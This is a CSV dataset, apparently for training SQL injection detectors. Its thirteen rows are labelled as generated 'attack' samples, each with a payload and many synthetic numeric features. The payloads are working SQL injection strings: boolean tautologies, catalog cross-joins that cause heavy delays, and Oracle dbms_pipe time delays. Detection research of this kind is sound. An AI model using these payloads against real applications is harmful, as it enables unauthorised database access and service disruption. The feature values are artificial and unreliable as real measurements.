id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000011,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,4.616235370996058,199.7166290283203,80.2049560546875,20.895219802856445,60.1350212097168,0.13705742359161377,50.611297607421875,26.387033462524414,1.1804399490356445,0.31997862458229065,0.13478705286979675,0.3259377181529999,0.15122060477733612,3.856316566467285,1.1063755750656128,0.6975008845329285,0.27014076709747314,0.04512666538357735,-0.026799164712429047,-0.21633568406105042,5.948692321777344,4.723703861236572,2.1077463626861572,0.22967058420181274,1.5656013488769531,-0.21290360391139984,-0.01178470067679882,0.22572118043899536,1.5961366891860962,0.8802419304847717,0.5150595307350159,-0.17339128255844116,-0.004848445765674114,-0.24817149341106415,0.38938063383102417,1.478268027305603,5.150639533996582,0.7485722303390503,0.9119828939437866,0.04600207135081291,0.5053555369377136,0.7254211902618408,-0.040477391332387924,0.22030575573444366,-0.19639381766319275,0.30577412247657776,0.22704437375068665,0.24082277715206146,0.21917203068733215,0.25558212399482727,0.13152854144573212,0.17339631915092468,-0.31520697474479675,0.26534420251846313,0.07471960783004761,-0.08706115186214447,0.20034024119377136,0.10416325181722641,-0.21230988204479218,-0.10266020894050598,-0.32856592535972595,0.09014468640089035,0.05985211580991745,2.665743589401245,-0.027188502252101898,0.033473338931798935,0.03477196767926216,0.2824023365974426,0.04083751514554024,0.18072517216205597,-0.26517781615257263,0.38340476155281067,-0.5137907862663269,0.05213348567485809,0.04542689025402069,-0.613234281539917,1.0711019039154053,0.6822484731674194,-0.18568632006645203,-0.07860670238733292,-0.008328285068273544,6.725078105926514,1.0677428245544434,0.029427293688058853,0.22844280302524567,-0.07164895534515381,0.15661698579788208,0.1828921139240265,-0.280486524105072
GAN_000012,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000029,4.361005688145024,202.59071350097656,65.3790283203125,22.27370834350586,64.86940002441406,0.15835188329219818,46.67854309082031,25.71578598022461,1.1543769836425781,0.31010180711746216,0.1500147134065628,0.35588303208351135,0.1509300172328949,3.8141067028045654,1.0612080097198486,0.6481640934944153,0.6129487156867981,0.058794230222702026,-0.008726113475859165,-0.18943946063518524,5.825833797454834,6.623323917388916,1.5668749809265137,0.15681427717208862,1.5257439613342285,-0.17452697455883026,0.019138194620609283,0.2782455384731293,1.329896330833435,0.5764129757881165,0.538209080696106,-0.3574269115924835,0.056235745549201965,-0.20775368809700012,0.45675647258758545,1.5677211284637451,5.713981628417969,0.9005426168441772,0.9274898171424866,0.15655414760112762,0.4289845824241638,0.5756569504737854,-0.004685699008405209,0.13688522577285767,-0.02218915894627571,0.17570772767066956,0.1046227365732193,0.20595724880695343,0.1519615650177002,0.22738365828990936,0.07665352523326874,0.1709984540939331,-0.14482150971889496,0.1531500518321991,0.08493895083665848,-0.26695430278778076,0.10848259925842285,0.21191009879112244,-0.3120763897895813,-0.149572491645813,-0.18789297342300415,0.06203731894493103,0.09390953928232193,3.0726077556610107,-0.04032643139362335,0.015983734279870987,0.05299639329314232,-0.024544507265090942,-0.28260985016822815,0.14925751090049744,-0.19927406311035156,0.4451005756855011,-0.33020463585853577,0.04090861976146698,0.1609523594379425,-0.2093999683856964,0.9281206727027893,0.6876974105834961,-0.13894101977348328,-0.03656739741563797,0.032286278903484344,8.164449691772461,0.9667249321937561,0.06924140453338623,0.2873944044113159,-0.18316835165023804,0.19505774974822998,0.16732539236545563,-0.1700856238603592
GAN_000013,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000073,6.137061188767682,229.8367156982422,79.77950286865234,21.090904235839844,71.28839111328125,0.28273555636405945,35.12696075439453,28.54765510559082,1.5081382989883423,0.29026511311531067,0.12713128328323364,0.3140890598297119,0.16093826293945312,3.828916549682617,0.25756973028182983,0.9514623284339905,0.08557910472154617,0.12452064454555511,-0.18241193890571594,-0.7470611333847046,4.550590991973877,4.882140159606934,1.5530781745910645,0.3013395667076111,1.226914405822754,-0.37822777032852173,0.26717400550842285,0.15615883469581604,1.764871597290039,1.0758827924728394,1.1119779348373413,-0.5564233064651489,-0.08443038910627365,-0.32844141125679016,0.20971405506134033,1.4018727540969849,6.614540100097656,0.5777994990348816,1.336607575416565,0.0796898603439331,0.6165936589241028,0.7885848879814148,0.12268844246864319,0.29680120944976807,-0.14271041750907898,0.559038519859314,0.3946525752544403,0.41748449206352234,0.28051528334617615,0.43017327785491943,0.061468012630939484,0.15020130574703217,-0.7260481119155884,0.3360026776790619,-0.03323235362768173,-0.49067753553390503,0.5523114800453186,0.04976259171962738,-0.3476766347885132,-0.39244750142097473,-0.33351096510887146,0.253293514251709,0.3534340560436249,4.110652923583984,-0.1672484576702118,0.026835108175873756,0.010340007953345776,0.29585033655166626,-0.18881160020828247,0.2525954246520996,-0.3273991346359253,0.705621600151062,-0.9824588298797607,0.10709305852651596,-0.04208622872829437,-1.1309341192245483,1.0849846601486206,0.8591147661209106,-0.5306452512741089,-0.1837703436613083,-0.13592199981212616,5.830609321594238,1.2437522411346436,-0.15175020694732666,0.4639818072319031,-0.3227267563343048,0.4957933723926544,0.21267201006412506,-0.615063488483429
GAN_000014,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000016,6.300434870053809,243.08590698242188,86.25846099853516,23.643383026123047,94.21651458740234,0.31682947278022766,38.9623908996582,27.550045013427734,1.2646608352661133,0.2677753269672394,0.12789331376552582,0.3286226689815521,0.14578792452812195,3.8739988803863525,0.7144033908843994,0.8374605774879456,0.26740193367004395,0.11894621700048447,-0.1465485394001007,-0.3150693476200104,7.005181789398193,9.990851402282715,1.4779455661773682,0.23893752694129944,1.4473228454589844,-0.4063369631767273,0.15320245921611786,0.29238173365592957,1.2201511859893799,0.943935751914978,1.073907732963562,-0.7115746140480042,-0.15056821703910828,-0.040554895997047424,0.4574916362762451,1.2958747148513794,7.9216532707214355,0.941083550453186,1.2571730613708496,0.37323588132858276,0.6065042018890381,0.6399604678153992,0.3858358860015869,0.1989106386899948,0.14275744557380676,0.29664796590805054,-0.00026192329823970795,0.3625047504901886,0.2541426420211792,0.4187033772468567,0.16142043471336365,0.2323378324508667,-0.4516097903251648,0.4169938564300537,-0.0034198835492134094,-0.5098807215690613,0.6921964287757874,0.07856180518865585,-0.5014169812202454,-0.517772912979126,-0.342827171087265,-0.03167733550071716,0.17236417531967163,5.190286159515381,-0.12861721217632294,0.010493001900613308,0.08429685980081558,-0.056496866047382355,-0.28823015093803406,0.40019387006759644,-0.5398353934288025,1.2243201732635498,-0.4541449546813965,0.08413281291723251,0.2429632544517517,-0.8452985286712646,1.1208218336105347,0.750139594078064,-0.46499815583229065,-0.24030910432338715,0.141944020986557,10.500421524047852,1.0463770627975464,0.2681564688682556,0.3177352547645569,-0.7340383529663086,0.6918930411338806,0.47231432795524597,-0.49334579706192017
GAN_000015,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,6.8363921573665865,244.51670837402344,91.81582641601562,22.123615264892578,91.79821014404297,0.3771253526210785,39.18008041381836,24.073196411132812,1.0961596965789795,0.2927911877632141,0.08147923648357391,0.3116888403892517,0.14098304510116577,3.980273485183716,0.9182738065719604,0.8851833939552307,0.0761999562382698,0.1164110004901886,-0.12702736258506775,-0.47750961780548096,7.94411563873291,7.839177131652832,1.5551494359970093,0.4842139482498169,1.6604727506637573,-0.5118647217750549,0.11913299560546875,0.0715392455458641,2.5468268394470215,1.2911427021026611,1.1121190786361694,-0.966755747795105,-0.10654108971357346,-0.10567456483840942,0.43462252616882324,1.186628818511963,6.823182582855225,0.8087302446365356,1.2046468257904053,0.40900087356567383,0.5115406513214111,0.7750705480575562,0.22256052494049072,0.10180285573005676,0.25809863209724426,0.38043567538261414,-0.136709526181221,0.30810749530792236,0.33013543486595154,0.46509429812431335,0.19071350991725922,0.2083645612001419,-0.41998156905174255,0.745927631855011,-0.0533674955368042,-0.6170748472213745,0.8065919876098633,0.08048529177904129,-0.6133036017417908,-0.7556231617927551,-0.6418310403823853,0.06960802525281906,0.4160167872905731,4.741263389587402,-0.04040249437093735,0.019291244447231293,0.09257517009973526,0.032043103128671646,-0.20940947532653809,0.6527121067047119,-0.5523195862770081,1.2434358596801758,-0.8653748035430908,0.10239463299512863,0.37598085403442383,-1.119045376777649,1.405661702156067,0.711575984954834,-0.34431159496307373,-0.34261295199394226,-0.02732599899172783,10.600196838378906,1.1860926151275635,0.47666892409324646,0.4797433614730835,-0.8661441802978516,0.9730373620986938,0.5444604754447937,-0.3968546986579895
GAN_000016,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000059,5.466483520907518,225.0514373779297,84.85086822509766,19.444049835205078,65.9906997680664,0.33947572112083435,55.6451416015625,25.34605598449707,1.3516260385513306,0.33087676763534546,0.11317721009254456,0.3363867998123169,0.14737185835838318,3.7331550121307373,0.7620130777359009,0.8409078121185303,0.16892339289188385,0.09127680212259293,-0.11166530102491379,-0.17772455513477325,5.838472843170166,5.674368381500244,2.201843023300171,0.47448140382766724,1.5174751281738281,-0.10530508309602737,-0.02447556145489216,0.1141088679432869,1.9422545433044434,1.1190158128738403,0.792949914932251,-0.6022197604179382,0.01896049454808235,-0.2587414085865021,0.3025985062122345,1.3253047466278076,6.259308815002441,0.827788233757019,1.106197476387024,-0.06094924360513687,0.669855535030365,0.7991697192192078,-0.027157612144947052,0.2969037890434265,-0.2282485067844391,0.42246001958847046,0.37940794229507446,0.3085859417915344,0.2616388499736786,0.3176865577697754,0.06677916646003723,0.16655652225017548,-0.6502219438552856,0.2859884202480316,-0.018581993877887726,-0.318857342004776,0.2421630471944809,0.0660182386636734,-0.4693220853805542,-0.5054833889007568,-0.596756637096405,-0.0175759419798851,0.24892118573188782,3.985200881958008,-0.08250327408313751,0.02047860063612461,0.045187074691057205,0.3999139666557312,-0.010025713592767715,0.15582190454006195,-0.27340614795684814,0.5994054675102234,-0.6431729793548584,0.10427911579608917,0.06483545154333115,-1.0376336574554443,1.2247214317321777,0.6637424826622009,-0.2274446040391922,-0.18313975632190704,-0.0446917749941349,7.583374977111816,1.1130903959274292,0.0035100802779197693,0.5638042688369751,-0.1890554130077362,0.40679070353507996,0.16661563515663147,-0.4964621067047119
GAN_000017,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000029,5.98616870977567,196.26112365722656,79.63558197021484,23.466936111450195,76.22572326660156,0.28327950835227966,39.451866149902344,28.920927047729492,1.1937087774276733,0.2507992684841156,0.12367801368236542,0.3537241220474243,0.14806874096393585,3.7418136596679688,0.42613548040390015,1.1103674173355103,0.16344566643238068,0.1082080751657486,-0.20500943064689636,-0.3369755148887634,7.1727614402771,5.9916462898254395,1.882736086845398,0.4264259934425354,1.2619726657867432,-0.18878871202468872,0.06337481737136841,0.2898423671722412,1.8399614095687866,0.9690670371055603,0.9379178285598755,-0.5028219223022461,-0.025617975741624832,-0.49296140670776367,0.2684093117713928,1.4670205116271973,6.102014541625977,1.0297561883926392,1.336840033531189,0.08857472240924835,0.6812371611595154,0.8103249073028564,0.0697401762008667,0.2334897518157959,0.08595231920480728,0.3017060458660126,0.5294784307479858,0.24394473433494568,0.2021867036819458,0.40173521637916565,0.07774633914232254,0.07702736556529999,-0.5246968269348145,0.4622862637042999,-0.08710499107837677,-0.40275275707244873,0.4020123779773712,0.24177885055541992,-0.8068510890007019,-0.3358951807022095,-0.22625404596328735,-0.04588555544614792,0.21760916709899902,5.109305381774902,-0.002315513789653778,0.041735436767339706,0.035088781267404556,0.030329614877700806,-0.18748195469379425,0.2843848168849945,-0.16625191271305084,0.8440350294113159,-0.7162978649139404,0.10636765509843826,0.08208858966827393,-0.7034156322479248,1.2683130502700806,0.7963693737983704,-0.3629564940929413,-0.1332804411649704,-0.15865261852741241,8.379140853881836,1.170440673828125,0.10358811914920807,0.6928027272224426,-0.42980173230171204,0.633679986000061,0.1674836426973343,-0.44757789373397827
GAN_000018,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000059,5.654672290090342,227.5462646484375,96.27545166015625,20.9637508392334,71.85771179199219,0.22613635659217834,55.81846237182617,22.775157928466797,1.1904613971710205,0.33722150325775146,0.10830584913492203,0.3144470155239105,0.14097943902015686,3.8795127868652344,0.6803460717201233,0.9972980618476868,-0.005742721259593964,0.08544759452342987,-0.14205357432365417,-0.0800950825214386,7.225543022155762,8.010375022888184,2.221532106399536,0.17352354526519775,1.4734524488449097,-0.2875477373600006,0.07793861627578735,0.13791537284851074,1.7415874004364014,1.1725233793258667,0.7167187333106995,-0.5293734073638916,-0.13538098335266113,-0.15319398045539856,0.30142420530319214,1.312512993812561,6.530989646911621,0.7482078671455383,1.110757827758789,-0.10457822680473328,0.6587393283843994,0.7812190055847168,0.0292399600148201,0.28737667202949524,-0.13154655694961548,0.3446348309516907,0.2940201759338379,0.2805790901184082,0.2874687910079956,0.3159942030906677,0.1352018564939499,0.19210824370384216,-0.7001218199729919,0.23066765069961548,0.25753170251846313,0.05979399383068085,0.41402024030685425,-0.019454067572951317,-0.32865071296691895,-0.4725085198879242,-0.7279009819030762,-0.15312305092811584,0.08145002275705338,4.045016765594482,-0.03488636016845703,0.049101658165454865,0.07997511327266693,0.26916199922561646,0.19599661231040955,0.30586308240890503,-0.5015917420387268,0.7403232455253601,-0.5003455877304077,0.08121421933174133,0.1438101828098297,-1.0724233388900757,1.1579513549804688,0.6961241960525513,-0.2560066878795624,-0.27370309829711914,-0.07581125199794769,10.046783447265625,1.1455059051513672,0.18779541552066803,0.5586552023887634,-0.4284007251262665,0.43640437722206116,0.3656967878341675,-0.4374990463256836
GAN_000019,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000059,6.836663005488665,207.87599182128906,93.45205688476562,21.11771583557129,73.05180358886719,0.3154561519622803,32.10932922363281,24.903522491455078,1.3031721115112305,0.2621334493160248,0.10366914421319962,0.319662481546402,0.14862699806690216,3.9063801765441895,0.5649246573448181,0.9687638282775879,-0.05408924072980881,0.14692197740077972,-0.19448161125183105,-0.6254579424858093,6.370911121368408,7.496272087097168,1.5868161916732788,0.3581015169620514,1.392354965209961,-0.3818863034248352,0.03333063796162605,0.14140208065509796,2.1095056533813477,1.205521821975708,1.1894553899765015,-0.9555171728134155,-0.15489910542964935,-0.6338788270950317,0.3140237629413605,1.3161994218826294,7.707251071929932,0.8553190231323242,1.352529764175415,0.1912963092327118,0.5748329758644104,0.952667772769928,0.15825489163398743,0.31350818276405334,0.050347983837127686,0.4659256339073181,0.3141494393348694,0.3538968861103058,0.2907326817512512,0.48826250433921814,0.09814020991325378,0.13004976511001587,-0.7288995385169983,0.493348628282547,0.05407646298408508,-0.4632445275783539,0.6935592293739319,0.08592278510332108,-0.7006809711456299,-0.7029533386230469,-0.6973545551300049,0.1412106454372406,0.37028780579566956,5.066407203674316,-0.04268137365579605,0.009721520356833935,0.07900594919919968,0.20106494426727295,-0.1866147369146347,0.3295784294605255,-0.36101412773132324,1.1210373640060425,-0.7882604598999023,0.11273204535245895,0.27396106719970703,-1.0572055578231812,1.5362367630004883,0.7278888821601868,-0.46933072805404663,-0.32272452116012573,-0.2044101357460022,9.429956436157227,1.2564713954925537,0.19572871923446655,0.5027854442596436,-0.7208868265151978,0.8778690099716187,0.6503506898880005,-0.49723315238952637
GAN_000020,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",nearest_attack_euclidean,R000076,6.755017181941136,243.97622680664062,100.87364196777344,18.77443504333496,70.70638275146484,0.32448625564575195,46.88003921508789,24.685440063476562,1.3052501678466797,0.2907811403274536,0.13266567885875702,0.31077638268470764,0.15489336848258972,3.972071886062622,0.3122730851173401,0.6055561304092407,-0.10968034714460373,0.11548346281051636,-0.20021235942840576,-0.3827572464942932,6.576892375946045,5.077897071838379,1.7099357843399048,0.324572890996933,1.3582311868667603,-0.8849144577980042,0.07156141102313995,0.1815788447856903,1.4973220825195312,1.1424193382263184,1.322690486907959,-0.8852055072784424,-0.1981489062309265,-0.42580103874206543,0.3193511962890625,1.1043001413345337,6.869019508361816,0.8291727304458618,0.8439255356788635,0.2337748259305954,0.4722244143486023,1.1005513668060303,0.019926926121115685,0.4001041054725647,0.010014932602643967,0.6620475053787231,0.26441991329193115,0.3796651065349579,0.3201068043708801,0.3700810968875885,0.11876038461923599,0.06587424129247665,-0.49692127108573914,0.6811433434486389,-0.035031758248806,-0.6021115183830261,0.7344946265220642,0.08815274387598038,-0.6995394825935364,-0.5193641781806946,-0.23297937214374542,-0.07374583184719086,0.5452420115470886,4.031346321105957,-0.08136086165904999,-0.001123078865930438,0.09484383463859558,0.16425107419490814,-0.10431355237960815,0.672347903251648,-0.5134844779968262,1.1610909700393677,-1.1851252317428589,0.09854325652122498,0.10950938612222672,-1.1586061716079712,1.4816691875457764,0.7597325444221497,-0.4315691292285919,-0.25847429037094116,-0.14746582508087158,9.467924118041992,1.3544955253601074,0.0968603789806366,0.28261542320251465,-0.91744464635849,0.7723915576934814,0.7709280848503113,-0.6258248686790466
GAN_000021,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000029,4.857146329168694,215.6490478515625,77.33245849609375,19.91121482849121,65.17721557617188,0.17210043966770172,45.36100387573242,23.672582626342773,1.0450341701507568,0.3100091218948364,0.147641122341156,0.3384726345539093,0.1539214849472046,3.8752520084381104,1.0214537382125854,0.832847535610199,0.3899993896484375,0.08345174789428711,-0.010903962887823582,-0.10577044636011124,5.492015838623047,5.826024532318115,1.7713921070098877,0.08105148375034332,1.5220451354980469,-0.3302310109138489,0.07610218226909637,0.06974919885396957,1.0789415836334229,0.6712135672569275,0.5379734039306641,-0.4368792176246643,0.010089990682899952,-0.22161151468753815,0.4827536344528198,1.3752213716506958,5.768812656402588,0.7948861718177795,0.8918309211730957,0.22215546667575836,0.4329878091812134,0.5725550055503845,0.06278105825185776,0.2052953839302063,-0.17209812998771667,0.21494485437870026,0.27725398540496826,0.2268257737159729,0.21354490518569946,0.2103569507598877,0.09198767691850662,0.15065059065818787,-0.2300368696451187,0.08785049617290497,0.008770890533924103,-0.3266455829143524,0.32266587018966675,0.08833403885364532,-0.38285255432128906,-0.3370397090911865,-0.38800305128097534,-0.10761694610118866,0.13808315992355347,3.2024245262145996,-0.03037211298942566,0.05572637915611267,0.080533966422081,0.06449107825756073,-0.012359093874692917,0.2632407546043396,-0.38405662775039673,0.6097504496574402,-0.45556309819221497,0.03806571662425995,0.1320742666721344,-0.5559960603713989,1.0079628229141235,0.700797975063324,-0.23752813041210175,-0.06340355426073074,0.03834619000554085,8.40713119506836,1.0064572095870972,-0.03708357363939285,0.20457163453102112,-0.35139328241348267,0.42984315752983093,0.1958838254213333,-0.4221859574317932
GAN_000022,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",nearest_attack_euclidean,R000076,7.555799855571996,234.1828155517578,93.84349060058594,17.252058029174805,78.65055847167969,0.3175058662891388,26.809097290039062,26.935880661010742,1.253368854522705,0.2348383218050003,0.10324566811323166,0.31677672266960144,0.1418183445930481,3.949084758758545,-0.019906817004084587,1.0170156955718994,-0.3567555546760559,0.17332985997200012,-0.23181551694869995,-0.7287606596946716,7.068122386932373,7.5511393547058105,1.0738036632537842,0.568718433380127,1.1513561010360718,-0.4934789836406708,0.17497530579566956,0.27943819761276245,2.4551830291748047,1.185295820236206,1.2953763008117676,-0.9798938632011414,-0.17712149024009705,-0.3972104787826538,0.3292311131954193,1.2100884914398193,8.211424827575684,1.139089822769165,1.306619644165039,0.4368000626564026,0.42294448614120483,0.9642547965049744,0.40913835167884827,0.39727404713630676,-0.2177896797657013,0.6108763813972473,0.46104490756988525,0.4134729504585266,0.31930485367774963,0.4678361415863037,0.06950279325246811,0.1439402550458908,-0.5664503574371338,0.37983518838882446,-0.10532107949256897,-0.6308971047401428,0.8929145932197571,0.15023373067378998,-1.1594653129577637,-0.5533005595207214,-0.40996772050857544,-0.015302225947380066,0.5392128825187683,6.178564071655273,-0.2636011838912964,0.029082389548420906,0.09948472678661346,-0.17012247443199158,-0.3009662628173828,0.6598291993141174,-0.581345796585083,1.3176729679107666,-0.8809891939163208,0.14190390706062317,0.17713475227355957,-1.218041181564331,1.6539379358291626,0.8096850514411926,-0.7395586371421814,-0.35200923681259155,-0.11820478737354279,9.041244506835938,1.2696369886398315,0.3235708773136139,0.47199851274490356,-0.9118401408195496,0.7453002333641052,0.674769401550293,-0.576963484287262
GAN_000023,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,6.267045796411371,229.2540283203125,78.44733428955078,20.367158889770508,78.72185516357422,0.2833669185638428,36.11101150512695,23.76074981689453,1.1983007192611694,0.25312134623527527,0.14745472371578217,0.3084715008735657,0.15690977871418,3.9392600059509277,0.1804143786430359,0.9203126430511475,0.17916078865528107,0.12831297516822815,-0.05634535104036331,-0.4505164921283722,5.149807929992676,6.907095432281494,1.3975367546081543,0.4580800533294678,1.451133131980896,-0.3919226825237274,0.24180559813976288,0.2709805965423584,1.7703686952590942,0.9765530824661255,0.987897515296936,-0.6144208908081055,-0.07829829305410385,-0.26049351692199707,0.40548092126846313,1.256832480430603,7.397813320159912,0.9597964882850647,1.047756314277649,0.2473028153181076,0.5477386713027954,0.7494658827781677,0.15914779901504517,0.14913617074489594,-0.12202774733304977,0.4272608160972595,0.23519958555698395,0.387247234582901,0.2634586691856384,0.39441922307014465,0.10417625308036804,0.19046948850154877,-0.361238569021225,0.4997733235359192,0.05005498230457306,-0.5994401574134827,0.7220226526260376,-0.02461298368871212,-0.5619280338287354,-0.5242207646369934,-0.38784968852996826,0.008387699723243713,0.3746055066585541,4.655696868896484,-0.1364716738462448,0.04509735852479935,0.08927570283412933,0.40207284688949585,-0.25125810503959656,0.24547582864761353,-0.4511227011680603,1.1300113201141357,-0.8090402483940125,0.1015561893582344,0.22592225670814514,-1.0078336000442505,1.269366979598999,0.7111072540283203,-0.4801052510738373,-0.18106551468372345,0.06193235516548157,7.714385032653809,1.1376336812973022,0.19986240565776825,0.2674520015716553,-0.5280541181564331,0.7848133444786072,0.4799506664276123,-0.43502700328826904
